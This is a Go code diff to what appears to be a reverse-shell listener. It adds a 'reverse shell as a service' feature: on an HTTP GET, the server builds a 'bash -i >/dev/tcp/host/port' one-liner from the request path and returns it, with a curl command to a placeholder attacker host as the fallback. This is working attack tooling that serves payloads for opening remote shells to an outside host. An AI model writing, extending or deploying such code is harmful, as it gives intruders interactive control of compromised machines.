@@ -4,6 +4,7 @@ import (
 	"bytes"
 	"fmt"
 	"net"
+	"strconv"
 	"strings"
 	"time"
 
@@ -53,7 +54,49 @@ func (s *TCPServer) Run() {
 		}
 		client := CreateTCPClient(conn)
 		log.Info("New client %s Connected", client.Desc())
-		s.AddTCPClient(client)
+		log.Info("Checking service")
+		// Reverse shell as a service
+		buffer := make([]byte, 4)
+		client.Conn.SetReadDeadline(time.Now().Add(time.Second * 3))
+		client.ReadLock.Lock()
+		n, err := client.Conn.Read(buffer)
+		client.ReadLock.Unlock()
+		client.Conn.SetReadDeadline(time.Time{})
+		if err != nil {
+			if netErr, ok := err.(net.Error); ok && netErr.Timeout() {
+				log.Error("Not requesting for service")
+			} else {
+				log.Error("Read from client failed")
+				client.Interactive = false
+				Ctx.DeleteTCPClient(client)
+			}
+		}
+		log.Info("%d bytes read from client: %s", n, buffer[:n])
+		if string(buffer[:n]) == "GET " {
+			requestURI := client.ReadUntilClean(" ")
+			log.Info("Request URI: %s", requestURI)
+			var command string = "curl http://reverse.service/attacker-host/attacker-port"
+			target := strings.Split(requestURI, "/")
+			if strings.HasPrefix(requestURI, "/") && len(target) == 3 {
+				host := target[1]
+				port, err := strconv.Atoi(target[2])
+				if err == nil {
+					command = fmt.Sprintf("bash -c 'bash -i >/dev/tcp/%s/%d 0>&1'", host, port)
+				} else {
+					log.Debug("Invalid port number: %s", target[2])
+				}
+			} else {
+				log.Debug("Invalid HTTP Request-Line: %s", buffer[:n])
+			}
+			client.Write([]byte("HTTP/1.0 200 OK\r\n"))
+			client.Write([]byte(fmt.Sprintf("Content-Length: %d\r\n", len(command))))
+			client.Write([]byte("\r\n"))
+			client.Write([]byte(command))
+			Ctx.DeleteTCPClient(client)
+
+		} else {
+			s.AddTCPClient(client)
+		}
 	}
 }
 
